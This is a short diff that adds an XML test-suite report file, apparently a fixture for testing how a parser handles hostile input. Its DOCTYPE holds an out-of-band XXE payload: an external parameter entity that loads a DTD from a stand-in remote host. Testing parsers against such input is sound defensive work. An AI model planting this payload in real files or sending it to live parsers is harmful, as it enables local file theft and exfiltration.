@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE testsuite [<!ENTITY % ext SYSTEM "https://example.invalid/p.dtd"> %ext;]>
+<testsuite name="s" tests="1"><testcase name="t"/></testsuite>
